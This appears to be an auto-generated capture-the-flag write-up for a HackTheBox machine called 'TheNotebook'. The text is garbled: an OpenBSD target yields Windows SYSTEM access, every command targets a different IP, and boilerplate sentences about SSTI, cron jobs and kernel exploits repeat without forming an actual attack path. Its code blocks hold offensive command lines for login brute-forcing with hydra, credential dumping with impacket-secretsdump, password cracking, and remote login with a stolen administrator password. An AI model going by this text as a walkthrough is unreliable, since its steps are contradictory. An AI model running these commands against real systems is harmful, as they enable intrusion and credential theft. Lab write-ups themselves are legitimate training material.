---
TitleSEO: "HackTheBox — TheNotebook (Medium OpenBSD) | ZureFX"
TitlePost: "HackTheBox — TheNotebook (Medium OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox TheNotebook. Constrained Delegation and SUID Binary to achieve medium compromise on OpenBSD."
Keywords: "easy, tryhackme, hackthebox, medium, pwntilldawn, hard, insane"
URL: "https://zurefx.github.io/writeups/htb-thenotebook-527.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-thenotebook-527/"
Date: "2025-03-17"
Tags: "Easy, TryHackMe, HackTheBox, Medium, PwnTillDawn, Hard, Insane"
Section: "writeups"
Lang: "en"
main_img: "htb-thenotebook-527"
Permalink: "/writeups/htb-thenotebook-527.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **TheNotebook** is rated **Medium** on HackTheBox. It runs **OpenBSD** and the IP address during this analysis was `10.110.201.54`.

### Objectives

The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Service Enumeration

The application stored sensitive credentials in an unencrypted configuration file. Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
crackmapexec smb 10.95.169.127 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p25,139,3268 10.117.59.134 -oN scan.txt
feroxbuster -h
```

Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation.

### SMB Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
feroxbuster -h
gobuster dir -u http://10.100.213.105/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation.

## Exploitation

### Vulnerability Identification

The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file.

Key finding: **Constrained Delegation**.

Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Initial Access

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
nmap -sCV -p3306,993,3268 10.27.39.16 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.91.178.24 -u administrator -p 'P@ssw0rd!'
```

Command injection was possible through unsanitized user input in the search functionality. Command injection was possible through unsanitized user input in the search functionality. Weak file permissions allowed modification of critical system files.

## Privilege Escalation

### Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). The database credentials were hardcoded in the application source code. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
feroxbuster -h
```

### Exploitation

Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.58.79.64 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.50.128.250
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Lateral movement was facilitated by reusing discovered credentials across services. The target system was identified as running a vulnerable version of the service.

## Summary

### Tools Used

- `gobuster`
- `msfvenom`
- `ligolo-ng`
- `lookupsid`
- `GetUserSPNs`
- `sharphound`

### Key Takeaways

- Constrained Delegation
- SUID Binary
- Cron Job
- XXE
